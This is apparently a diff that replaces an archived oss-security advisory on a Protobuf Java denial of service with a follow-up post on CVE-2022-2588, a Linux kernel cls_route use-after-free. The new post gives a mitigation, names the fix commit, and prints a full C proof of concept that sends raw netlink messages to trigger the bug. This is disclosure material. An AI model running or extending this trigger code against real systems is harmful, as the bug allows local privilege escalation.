@@ -1,41 +1,276 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/01/12/4
-Message-ID: <CABbtqzEDcwmS3=iu-cFjTOuxBa-50kNxQVRvoTwq3M73Ohf1yQ@mail.gmail.com>
-Date: Wed, 12 Jan 2022 13:32:51 +0100
-From: Ana Oprea <anaoprea@...gle.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/08/18/2
+Message-ID: <Yv1PTZIJ4qtA2ndU@quatroqueijos>
+Date: Wed, 17 Aug 2022 17:27:57 -0300
+From: Thadeu Lima de Souza Cascardo <cascardo@...onical.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2021-22569: Protobuf Java, Kotlin, JRuby DoS
+Subject: Re: CVE-2022-2588 - Linux kernel cls_route UAF
 Content-Type: text/plain; charset=utf-8
 
-Summary
-A potential Denial of Service issue in protobuf-java was discovered in the
-parsing procedure for binary data.
-- Reporter: OSS-Fuzz [1]
-- Affected versions: All versions of Java Protobufs (including Kotlin and
-JRuby) prior to the versions listed below. Protobuf "javalite" users
-(typically Android) are not affected.
+On Tue, Aug 09, 2022 at 02:11:54PM -0300, Thadeu Lima de Souza Cascardo wrote:
+> CVE-2022-2588 - Linux kernel cls_route UAF
+> 
+> It was discovered that the cls_route filter implementation in the Linux kernel
+> would not remove an old filter from the hashtable before freeing it if its
+> handle had the value 0.
+> 
+> Zhenpeng Lin working with Trend Micro's Zero Day Initiative discovered that
+> this vulnerability could be exploited for Local Privilege Escalation. This has
+> been reported as ZDI-CAN-17440, and assigned CVE-2022-2588.
+> 
+> This bug has been present since the first Linux commit git, v2.6.12-rc2.
+> 
+> Exploiting it requires CAP_NET_ADMIN in any user or network namespace.
+> 
+> It can be mitigated by those users who do not rely on cls_route, by adding
+> 'install cls_route /bin/true' to their modprobe.conf or modprobe.d configs,
+> in case it's built as a module.
+> 
+> A PoC that will trigger a WARNING is going to be posted in a week.
+> 
+> Fixes have been sent to netdev@...r.kernel.org and are at
+> https://lore.kernel.org/netdev/20220809170518.164662-1-cascardo@canonical.com/T/#u.
 
-Severity
-CVE-2021-22569 High - CVSS Score: 7.5 [2]
-An implementation weakness in how unknown fields are parsed in Java. A
-small (~800 KB) malicious payload can occupy the parser for several minutes
-by creating large numbers of short-lived objects that cause frequent,
-repeated GC pauses.
+This has been merged as commit 9ad36309e2719a884f946678e0296be10f0bb4c1.
 
-Proof of Concept
-For reproduction details, please refer to the oss-fuzz issue [3] that
-identifies the specific inputs that exercise this parsing weakness.
+And here is the PoC.
 
-Remediation and Mitigation
-Please update to the latest available versions of the following packages:
-- protobuf-java (3.16.1, 3.18.2, 3.19.2)
-- protobuf-kotlin (3.18.2, 3.19.2)
-- google-protobuf [JRuby gem] (3.19.2)
 
-[1] https://github.com/google/oss-fuzz
-[2] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22569
-[3] https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=39330
+#define _GNU_SOURCE
+#include <sched.h>
+#include <sys/socket.h>
+#include <linux/netlink.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/wait.h>
+#include <stdlib.h>
+#include <string.h>
+#include <linux/pkt_sched.h>
 
-Kind regards,
-Ana
+#include <sys/types.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+#include <stdlib.h>
 
+
+static char newlink[] = {
+	/* len */
+	56, 0x00, 0x00, 0x00,
+	/* type = NEWLINK */
+	16, 0x00,
+	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
+	0x01, 0x04,
+	/* seq */
+	0x01, 0x00, 0x00, 0x00,
+	/* pid */
+	0x00, 0x00, 0x00, 0x00,
+	/* ifi_family */
+	0x00, 0x00, 0x00, 0x00,
+	/* ifi_ifindex */
+	0x30, 0x00, 0x00, 0x00,
+	/* ifi_flags */
+	0x00, 0x00, 0x00, 0x00,
+	/* ifi_change */
+	0x00, 0x00, 0x00, 0x00,
+	/* nla_len, nla_type */
+	0x08, 0x00, 0x03, 0x00,
+	/* string */
+	'e', 't', '2', 0,
+	/* nla_len, nla_type */
+	16, 0x00, 18, 0x00,
+	/* nested nla_len, nla_type */
+	10, 0x00, 0x01, 0x00,
+	'd', 'u', 'm', 'm',
+	'y', 0x00, 0x00, 0x00,
+};
+
+static char dellink[] = {
+	/* len */
+	40, 0x00, 0x00, 0x00,
+	/* type = DELLINK */
+	17, 0x00,
+	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
+	0x01, 0x04,
+	/* seq */
+	0x01, 0x00, 0x00, 0x00,
+	/* pid */
+	0x00, 0x00, 0x00, 0x00,
+	/* ifi_family */
+	0x00, 0x00, 0x00, 0x00,
+	/* ifi_ifindex */
+	0x00, 0x00, 0x00, 0x00,
+	/* ifi_flags */
+	0x00, 0x00, 0x00, 0x00,
+	/* ifi_change */
+	0x00, 0x00, 0x00, 0x00,
+	/* nla_len, nla_type */
+	0x08, 0x00, 0x03, 0x00,
+	/* string */
+	'e', 't', '2', 0,
+};
+
+static char tfilter[] = {
+	/* len */
+	68, 0x00, 0x00, 0x00,
+	/* type = NEWTFILTER */
+	44, 0x00,
+	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
+	0x41, 0x04,
+	/* seq */
+	0x01, 0x00, 0x00, 0x00,
+	/* pid */
+	0x00, 0x00, 0x00, 0x00,
+	/* tcm_family */
+	0x00, 0x00, 0x00, 0x00,
+	/* tcm_ifindex */
+	0x30, 0x00, 0x00, 0x00,
+	/* tcm_handle */
+	0x00, 0x00, 0x00, 0x00,
+	/* tcm_parent */
+	0x00, 0x00, 0x01, 0x00,
+	/* tcm_info = protocol/prio */
+	0x01, 0x00, 0x01, 0x00,
+	/* nla_len, nla_type */
+	0x0a, 0x00, 0x01, 0x00,
+	/* string */
+	'r', 'o', 'u', 't',
+	'e', 0, 0, 0,
+	/* OPTIONS */
+	0x14, 0x00, 0x02, 0x00,
+	/* ROUTE4_TO */
+	0x08, 0x00, 0x02, 0x00,
+	0x00, 0x00, 0x00, 0x00,
+	/* ROUTE4_FROM */
+	0x08, 0x00, 0x03, 0x00,
+	0x00, 0x00, 0x00, 0x00,
+};
+
+static char ntfilter[] = {
+	/* len */
+	56, 0x00, 0x00, 0x00,
+	/* type = NEWTFILTER */
+	44, 0x00,
+	/* flags = NLM_F_REQUEST | NLM_F_CREATE */
+	/* 0x200 = NLM_F_EXCL */
+	0x41, 0x04,
+	/* seq */
+	0x01, 0x00, 0x00, 0x00,
+	/* pid */
+	0x00, 0x00, 0x00, 0x00,
+	/* tcm_family */
+	0x00, 0x00, 0x00, 0x00,
+	/* tcm_ifindex */
+	0x30, 0x00, 0x00, 0x00,
+	/* tcm_handle */
+	0x00, 0x00, 0x00, 0x00,
+	/* tcm_parent */
+	0x00, 0x00, 0x01, 0x00,
+	/* tcm_info = protocol/prio */
+	0x01, 0x00, 0x01, 0x00,
+	/* OPTIONS */
+	0x14, 0x00, 0x02, 0x00,
+	/* ROUTE4_TO */
+	0x08, 0x00, 0x02, 0x00,
+	0x01, 0x00, 0x00, 0x00,
+	/* ROUTE4_FROM */
+	0x08, 0x00, 0x03, 0x00,
+	0x00, 0x00, 0x00, 0x00,
+};
+
+
+static char linkcmd[] = {
+	/* len */
+	44, 0x00, 0x00, 0x00,
+	/* type = NEWQDISC */
+	36, 0x00,
+	/* flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_REPLACE */
+	0x01, 0x05,
+	/* seq */
+	0x01, 0x00, 0x00, 0x00,
+	/* pid */
+	0x00, 0x00, 0x00, 0x00,
+	/* tcm_family */
+	0x00, 0x00, 0x00, 0x00,
+	/* tcm_ifindex */
+	0x30, 0x00, 0x00, 0x00,
+	/* tcm_handle */
+	0x00, 0x00, 0x01, 0x00,
+	/* tcm_parent */
+	0xff, 0xff, 0xff, 0xff,
+	/* tcm_info = protocol/prio */
+	0x00, 0x00, 0x00, 0x00,
+	/* nla_len, nla_type */
+	0x04, 0x00, 0x01, 0x00,
+	/* string */
+};
+
+int build_qfq(char *buf)
+{
+	char *qopt;
+	short *tlen;
+	char *qdisc = "qfq";
+
+	short *optlen;
+	short *opttype;
+
+	tlen = buf;
+
+	memset(buf, 0, sizeof(buf));
+	memcpy(buf, linkcmd, sizeof(linkcmd));
+	strcpy(buf+sizeof(linkcmd), qdisc);
+	*tlen = sizeof(linkcmd) + strlen(qdisc) + 1;
+	buf[36] = strlen(qdisc)+5;
+
+	qopt = buf + *tlen;
+	/* nla_len, nla_type */
+	/* 24, 0x00, 0x02, 0x00, */
+	optlen = qopt;
+	opttype = optlen + 1;
+	*opttype = 0x2;
+
+	*optlen = 4;
+
+	*tlen += *optlen;
+
+	return *tlen;
+}
+
+int main(int argc, char **argv)
+{
+	int s;
+	pid_t p;
+	int *error;
+	char buf[4096];
+	int tlen;
+	error = (int *) (buf + 16);
+
+	unsigned long count = 1;
+	int i;
+
+	unshare(CLONE_NEWUSER|CLONE_NEWNET);
+	tlen = build_qfq(buf);
+
+	s = socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);
+	write(s, newlink, sizeof(newlink));
+	read(s, buf, sizeof(buf));
+	printf("%d\n", *error);
+
+	write(s, buf, tlen);
+	read(s, buf, sizeof(buf));
+	printf("%d\n", *error);
+
+	write(s, tfilter, sizeof(tfilter));
+	read(s, buf, sizeof(buf));
+	printf("%d\n", *error);
+
+	write(s, ntfilter, sizeof(ntfilter));
+	read(s, buf, sizeof(buf));
+	printf("%d\n", *error);
+
+	write(s, dellink, sizeof(dellink));
+	read(s, buf, sizeof(buf));
+	printf("%d\n", *error);
+
+
+	return 0;
+}
